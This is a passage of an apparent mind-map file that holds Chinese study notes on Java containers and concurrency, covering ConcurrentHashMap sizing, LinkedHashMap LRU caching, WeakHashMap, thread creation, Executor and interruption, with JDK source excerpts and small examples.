    <a aria-label="Permalink: 2. size 操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-size-操作">
</a>
    <p dir="auto">
      每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。
    </p>
    <pre>/**
 * The number of elements. Accessed only either within locks
 * or among other volatile reads that maintain visibility.
 */
transient int count;</pre>
    <p dir="auto">
      在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。
    </p>
    <p dir="auto">
      ConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。
    </p>
    <p dir="auto">
      尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。
    </p>
    <p dir="auto">
      如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。
    </p>
    <pre>/**
 * Number of unsynchronized retries in size and containsValue
 * methods before resorting to locking. This is used to avoid
 * unbounded retries if tables undergo continuous modification
 * which would make it impossible to obtain an accurate result.
 */
static final int RETRIES_BEFORE_LOCK = 2;
public int size() {
    // Try a few times to get accurate count. On failure due to
    // continuous async changes in table, resort to locking.
    final Segment&lt;K,V&gt;[] segments = this.segments;
    int size;
    boolean overflow; // true if size overflows 32 bits
    long sum;         // sum of modCounts
    long last = 0L;   // previous sum
    int retries = -1; // first iteration isn't retry
    try {
        for (;;) {
            // 超过尝试次数，则对每个 Segment 加锁
            if (retries++ == RETRIES_BEFORE_LOCK) {
                for (int j = 0; j &lt; segments.length; ++j)
                    ensureSegment(j).lock(); // force creation
            }
            sum = 0L;
            size = 0;
            overflow = false;
            for (int j = 0; j &lt; segments.length; ++j) {
                Segment&lt;K,V&gt; seg = segmentAt(segments, j);
                if (seg != null) {
                    sum += seg.modCount;
                    int c = seg.count;
                    if (c &lt; 0 || (size += c) &lt; 0)
                        overflow = true;
                }
            }
            // 连续两次得到的结果一致，则认为这个结果是正确的
            if (sum == last)
                break;
            last = sum;
        }
    } finally {
        if (retries &gt; RETRIES_BEFORE_LOCK) {
            for (int j = 0; j &lt; segments.length; ++j)
                segmentAt(segments, j).unlock();
        }
    }
    return overflow ? Integer.MAX_VALUE : size;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1804888352" CREATED="1754750650466" MODIFIED="1754750650468"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. JDK 1.8 的改动
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. JDK 1.8 的改动" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#3-jdk-18-的改动">
</a>
    <p dir="auto">
      JDK 1.7 使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发度与 Segment 数量相等。
    </p>
    <p dir="auto">
      JDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。
    </p>
    <p dir="auto">
      并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1766616161" CREATED="1754750650469" MODIFIED="1754750650469"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      LinkedHashMap
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1054820897" CREATED="1754750650470" MODIFIED="1754750650472"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      存储结构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 存储结构" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#存储结构">
</a>
    <p dir="auto">
      继承自 HashMap，因此具有和 HashMap 一样的快速查找特性。
    </p>
    <pre>public class LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt; implements Map&lt;K,V&gt;</pre>
    <p dir="auto">
      内部维护了一个双向链表，用来维护插入顺序或者 LRU 顺序。
    </p>
    <pre>/**
 * The head (eldest) of the doubly linked list.
 */
transient LinkedHashMap.Entry&lt;K,V&gt; head;
/**
 * The tail (youngest) of the doubly linked list.
 */
transient LinkedHashMap.Entry&lt;K,V&gt; tail;</pre>
    <p dir="auto">
      accessOrder 决定了顺序，默认为 false，此时维护的是插入顺序。
    </p>
    <pre>final boolean accessOrder;</pre>
    <p dir="auto">
      LinkedHashMap 最重要的是以下用于维护顺序的函数，它们会在 put、get 等方法中调用。
    </p>
    <pre>void afterNodeAccess(Node&lt;K,V&gt; p) { }
void afterNodeInsertion(boolean evict) { }</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1321231008" CREATED="1754750650473" MODIFIED="1754750650475"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      afterNodeAccess()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: afterNodeAccess()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#afternodeaccess">
</a>
    <p dir="auto">
      当一个节点被访问时，如果 accessOrder 为 true，则会将该节点移到链表尾部。也就是说指定为 LRU 顺序之后，在每次访问一个节点时，会将这个节点移到链表尾部，保证链表尾部是最近访问的节点，那么链表首部就是最近最久未使用的节点。
    </p>
    <pre>void afterNodeAccess(Node&lt;K,V&gt; e) { // move node to last
    LinkedHashMap.Entry&lt;K,V&gt; last;
    if (accessOrder &amp;&amp; (last = tail) != e) {
        LinkedHashMap.Entry&lt;K,V&gt; p =
            (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after;
        p.after = null;
        if (b == null)
            head = a;
        else
            b.after = a;
        if (a != null)
            a.before = b;
        else
            last = b;
        if (last == null)
            head = p;
        else {
            p.before = last;
            last.after = p;
        }
        tail = p;
        ++modCount;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_295189264" CREATED="1754750650475" MODIFIED="1754750650477"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      afterNodeInsertion()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: afterNodeInsertion()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#afternodeinsertion">
</a>
    <p dir="auto">
      在 put 等操作之后执行，当 removeEldestEntry() 方法返回 true 时会移除最晚的节点，也就是链表首部节点 first。
    </p>
    <p dir="auto">
      evict 只有在构建 Map 的时候才为 false，在这里为 true。
    </p>
    <pre>void afterNodeInsertion(boolean evict) { // possibly remove eldest
    LinkedHashMap.Entry&lt;K,V&gt; first;
    if (evict &amp;&amp; (first = head) != null &amp;&amp; removeEldestEntry(first)) {
        K key = first.key;
        removeNode(hash(key), key, null, false, true);
    }
}</pre>
    <p dir="auto">
      removeEldestEntry() 默认为 false，如果需要让它为 true，需要继承 LinkedHashMap 并且覆盖这个方法的实现，这在实现 LRU 的缓存中特别有用，通过移除最近最久未使用的节点，从而保证缓存空间足够，并且缓存的数据都是热点数据。
    </p>
    <pre>protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) {
    return false;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1383784659" CREATED="1754750650478" MODIFIED="1754750650479"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      LRU 缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: LRU 缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#lru-缓存">
</a>
    <p dir="auto">
      以下是使用 LinkedHashMap 实现的一个 LRU 缓存：
    </p>
    <ul dir="auto">
      <li>
        设定最大缓存空间 MAX_ENTRIES 为 3；
      </li>
      <li>
        使用 LinkedHashMap 的构造函数将 accessOrder 设置为 true，开启 LRU 顺序；
      </li>
      <li>
        覆盖 removeEldestEntry() 方法实现，在节点多于 MAX_ENTRIES 就会将最近最久未使用的数据移除。
      </li>
    </ul>
    <pre>class LRUCache&lt;K, V&gt; extends LinkedHashMap&lt;K, V&gt; {
    private static final int MAX_ENTRIES = 3;
    protected boolean removeEldestEntry(Map.Entry eldest) {
        return size() &gt; MAX_ENTRIES;
    }
    LRUCache() {
        super(MAX_ENTRIES, 0.75f, true);
    }
}</pre>
    <pre>public static void main(String[] args) {
    LRUCache&lt;Integer, String&gt; cache = new LRUCache&lt;&gt;();
    cache.put(1, &quot;a&quot;);
    cache.put(2, &quot;b&quot;);
    cache.put(3, &quot;c&quot;);
    cache.get(1);
    cache.put(4, &quot;d&quot;);
    System.out.println(cache.keySet());
}</pre>
    <pre>[3, 1, 4]</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1983215815" CREATED="1754750650480" MODIFIED="1754750650480"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      WeakHashMap
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_264835979" CREATED="1754750650482" MODIFIED="1754750650483"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      存储结构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 存储结构" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#存储结构-1">
</a>
    <p dir="auto">
      WeakHashMap 的 Entry 继承自 WeakReference，被 WeakReference 关联的对象在下一次垃圾回收时会被回收。
    </p>
    <p dir="auto">
      WeakHashMap 主要用来实现缓存，通过使用 WeakHashMap 来引用缓存对象，由 JVM 对这部分缓存进行回收。
    </p>
    <pre>private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_668757414" CREATED="1754750650484" MODIFIED="1754750650486"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ConcurrentCache
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: ConcurrentCache" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#concurrentcache">
</a>
    <p dir="auto">
      Tomcat 中的 ConcurrentCache 使用了 WeakHashMap 来实现缓存功能。
    </p>
    <p dir="auto">
      ConcurrentCache 采取的是分代缓存：
    </p>
    <ul dir="auto">
      <li>
        经常使用的对象放入 eden 中，eden 使用 ConcurrentHashMap 实现，不用担心会被回收（伊甸园）；
      </li>
      <li>
        不常用的对象放入 longterm，longterm 使用 WeakHashMap 实现，这些老对象会被垃圾收集器回收。
      </li>
      <li>
        当调用 get() 方法时，会先从 eden 区获取，如果没有找到的话再到 longterm 获取，当从 longterm 获取到就把对象放入 eden 中，从而保证经常被访问的节点不容易被回收。
      </li>
      <li>
        当调用 put() 方法时，如果 eden 的大小超过了 size，那么就将 eden 中的所有对象都放入 longterm 中，利用虚拟机回收掉一部分不经常使用的对象。
      </li>
    </ul>
    <pre>public final class ConcurrentCache&lt;K, V&gt; {
    private final int size;
    private final Map&lt;K, V&gt; eden;
    private final Map&lt;K, V&gt; longterm;
    public ConcurrentCache(int size) {
        this.size = size;
        this.eden = new ConcurrentHashMap&lt;&gt;(size);
        this.longterm = new WeakHashMap&lt;&gt;(size);
    }
    public V get(K k) {
        V v = this.eden.get(k);
        if (v == null) {
            v = this.longterm.get(k);
            if (v != null)
                this.eden.put(k, v);
        }
        return v;
    }
    public void put(K k, V v) {
        if (this.eden.size() &gt;= size) {
            this.longterm.putAll(this.eden);
            this.eden.clear();
        }
        this.eden.put(k, v);
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_800105488" CREATED="1754750650487" MODIFIED="1754750650488"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Eckel B. Java 编程思想 [M]. 机械工业出版社, 2002.
      </li>
      <li>
        <a href="https://www.w3resource.com/java-tutorial/java-collections.php" rel="nofollow">Java Collection Framework</a>
      </li>
      <li>
        <a href="https://openhome.cc/Gossip/DesignPattern/IteratorPattern.htm" rel="nofollow">Iterator 模式</a>
      </li>
      <li>
        <a href="https://tech.meituan.com/java_hashmap.html" rel="nofollow">Java 8 系列之重新认识 HashMap</a>
      </li>
      <li>
        <a href="http://javarevisited.blogspot.hk/2010/10/difference-between-hashmap-and.html" rel="nofollow">What is difference between HashMap and Hashtable in Java?</a>
      </li>
      <li>
        <a href="http://www.zhangchangle.com/2018/02/07/Java%E9%9B%86%E5%90%88%E4%B9%8BHashMap/" rel="nofollow">Java 集合之 HashMap</a>
      </li>
      <li>
        <a href="http://www.programering.com/a/MDO3QDNwATM.html" rel="nofollow">The principle of ConcurrentHashMap analysis</a>
      </li>
      <li>
        <a href="https://www.ibm.com/developerworks/cn/java/java-lo-concurrenthashmap/" rel="nofollow">探索 ConcurrentHashMap 高并发性的实现机制</a>
      </li>
      <li>
        <a href="https://www.jianshu.com/p/75adf47958a7" rel="nofollow">HashMap 相关面试题及其解答</a>
      </li>
      <li>
        <a href="http://wiki.jikexueyuan.com/project/java-enhancement/java-thirtysix.html" rel="nofollow">Java 集合细节（二）：asList 的缺陷</a>
      </li>
      <li>
        <a href="http://javaconceptoftheday.com/java-collection-framework-linkedlist-class/" rel="nofollow">Java Collection Framework – The LinkedList Class</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_690147439" CREATED="1754749807833" MODIFIED="1754750666436" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 并发
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1918115940" CREATED="1754750650493" MODIFIED="1754750650494"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、使用线程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、使用线程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#一使用线程">
</a>
    <p dir="auto">
      有三种使用线程的方法：
    </p>
    <ul dir="auto">
      <li>
        实现 Runnable 接口；
      </li>
      <li>
        实现 Callable 接口；
      </li>
      <li>
        继承 Thread 类。
      </li>
    </ul>
    <p dir="auto">
      实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以理解为任务是通过线程驱动从而执行的。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1898850072" CREATED="1754750650495" MODIFIED="1754750650496"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现 Runnable 接口
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现 Runnable 接口" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#实现-runnable-接口">
</a>
    <p dir="auto">
      需要实现接口中的 run() 方法。
    </p>
    <pre>public class MyRunnable implements Runnable {
    @Override
    public void run() {
        // ...
    }
}</pre>
    <p dir="auto">
      使用 Runnable 实例再创建一个 Thread 实例，然后调用 Thread 实例的 start() 方法来启动线程。
    </p>
    <pre>public static void main(String[] args) {
    MyRunnable instance = new MyRunnable();
    Thread thread = new Thread(instance);
    thread.start();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_996537704" CREATED="1754750650497" MODIFIED="1754750650498"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现 Callable 接口
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现 Callable 接口" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#实现-callable-接口">
</a>
    <p dir="auto">
      与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。
    </p>
    <pre>public class MyCallable implements Callable&lt;Integer&gt; {
    public Integer call() {
        return 123;
    }
}</pre>
    <pre>public static void main(String[] args) throws ExecutionException, InterruptedException {
    MyCallable mc = new MyCallable();
    FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(mc);
    Thread thread = new Thread(ft);
    thread.start();
    System.out.println(ft.get());
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_108488981" CREATED="1754750650499" MODIFIED="1754750650500"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      继承 Thread 类
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 继承 Thread 类" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#继承-thread-类">
</a>
    <p dir="auto">
      同样也是需要实现 run() 方法，因为 Thread 类也实现了 Runable 接口。
    </p>
    <p dir="auto">
      当调用 start() 方法启动一个线程时，虚拟机会将该线程放入就绪队列中等待被调度，当一个线程被调度时会执行该线程的 run() 方法。
    </p>
    <pre>public class MyThread extends Thread {
    public void run() {
        // ...
    }
}</pre>
    <pre>public static void main(String[] args) {
    MyThread mt = new MyThread();
    mt.start();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_254397998" CREATED="1754750650501" MODIFIED="1754750650502"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现接口 VS 继承 Thread
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现接口 VS 继承 Thread" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#实现接口-vs-继承-thread">
</a>
    <p dir="auto">
      实现接口会更好一些，因为：
    </p>
    <ul dir="auto">
      <li>
        Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口；
      </li>
      <li>
        类可能只要求可执行就行，继承整个 Thread 类开销过大。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1969446573" CREATED="1754750650508" MODIFIED="1754750650508"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、基础线程机制
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_553755169" CREATED="1754750650510" MODIFIED="1754750650512"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Executor
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Executor" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#executor">
</a>
    <p dir="auto">
      Executor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。这里的异步是指多个任务的执行互不干扰，不需要进行同步操作。
    </p>
    <p dir="auto">
      主要有三种 Executor：
    </p>
    <ul dir="auto">
      <li>
        CachedThreadPool：一个任务创建一个线程；
      </li>
      <li>
        FixedThreadPool：所有任务只能使用固定大小的线程；
      </li>
      <li>
        SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。
      </li>
    </ul>
    <pre>public static void main(String[] args) {
    ExecutorService executorService = Executors.newCachedThreadPool();
    for (int i = 0; i &lt; 5; i++) {
        executorService.execute(new MyRunnable());
    }
    executorService.shutdown();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_104241526" CREATED="1754750650512" MODIFIED="1754750650514"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Daemon
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Daemon" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#daemon">
</a>
    <p dir="auto">
      守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。
    </p>
    <p dir="auto">
      当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。
    </p>
    <p dir="auto">
      main() 属于非守护线程。
    </p>
    <p dir="auto">
      在线程启动之前使用 setDaemon() 方法可以将一个线程设置为守护线程。
    </p>
    <pre>public static void main(String[] args) {
    Thread thread = new Thread(new MyRunnable());
    thread.setDaemon(true);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1939043085" CREATED="1754750650515" MODIFIED="1754750650516"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      sleep()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: sleep()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#sleep">
</a>
    <p dir="auto">
      Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。
    </p>
    <p dir="auto">
      sleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。
    </p>
    <pre>public void run() {
    try {
        Thread.sleep(3000);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_95485776" CREATED="1754750650517" MODIFIED="1754750650518"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      yield()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: yield()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#yield">
</a>
    <p dir="auto">
      对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。
    </p>
    <pre>public void run() {
    Thread.yield();
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_645195470" CREATED="1754750650518" MODIFIED="1754750650520"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、中断
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、中断" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#三中断">
</a>
    <p dir="auto">
      一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。
    </p>
  </body>
</html></richcontent>
<node ID="ID_958128597" CREATED="1754750650520" MODIFIED="1754750650522"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      InterruptedException
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: InterruptedException" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#interruptedexception">
</a>
    <p dir="auto">
      通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。
    </p>
    <p dir="auto">
      对于以下代码，在 main() 中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。
    </p>
    <pre>public class InterruptExample {
    private static class MyThread1 extends Thread {
        @Override
        public void run() {
            try {
                Thread.sleep(2000);
                System.out.println(&quot;Thread run&quot;);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}</pre>
    <pre>public static void main(String[] args) throws InterruptedException {
    Thread thread1 = new MyThread1();
    thread1.start();
    thread1.interrupt();
    System.out.println(&quot;Main run&quot;);
}</pre>
    <pre>Main run
java.lang.InterruptedException: sleep interrupted
    at java.lang.Thread.sleep(Native Method)
    at InterruptExample.lambda$main$0(InterruptExample.java:5)
    at InterruptExample$$Lambda$1/713338599.run(Unknown Source)
    at java.lang.Thread.run(Thread.java:745)</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1435707019" CREATED="1754750650522" MODIFIED="1754750650524"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      interrupted()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: interrupted()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#interrupted">
</a>
    <p dir="auto">
      如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。
    </p>
    <p dir="auto">
      但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。
    </p>
    <pre>public class InterruptExample {
    private static class MyThread2 extends Thread {
        @Override
        public void run() {
            while (!interrupted()) {
                // ..
            }
            System.out.println(&quot;Thread end&quot;);
        }
    }
}</pre>
    <pre>public static void main(String[] args) throws InterruptedException {
    Thread thread2 = new MyThread2();
    thread2.start();
    thread2.interrupt();
}</pre>
    <pre>Thread end</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1298954621" CREATED="1754750650524" MODIFIED="1754750650526"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Executor 的中断操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Executor 的中断操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#executor-的中断操作">
</a>
    <p dir="auto">
      调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。
    </p>
    <p dir="auto">
      以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。
    </p>
    <pre>public static void main(String[] args) {
    ExecutorService executorService = Executors.newCachedThreadPool();
    executorService.execute(() -&gt; {
        try {
            Thread.sleep(2000);
            System.out.println(&quot;Thread run&quot;);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    });
    executorService.shutdownNow();
    System.out.println(&quot;Main run&quot;);
}</pre>
    <pre>Main run
java.lang.InterruptedException: sleep interrupted
    at java.lang.Thread.sleep(Native Method)
    at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9)
    at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
    at java.lang.Thread.run(Thread.java:745)</pre>
    <p dir="auto">
      如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future&lt;?&gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。
    </p>
    <pre>Future&lt;?&gt; future = executorService.submit(() -&gt; {
    // ..
});
future.cancel(true);</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_586597422" CREATED="1754750650526" MODIFIED="1754750650528"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、互斥同步
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、互斥同步" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#四互斥同步">
</a>
    <p dir="auto">
      Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。
    </p>
  </body>
</html></richcontent>
<node ID="ID_63765883" CREATED="1754750650528" MODIFIED="1754750650530"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      synchronized
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: synchronized" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md#synchronized">
</a>
    <p dir="auto">
      <strong>1. 同步一个代码块</strong>
    </p>
    <pre>public void func() {
    synchronized (this) {
        // ...
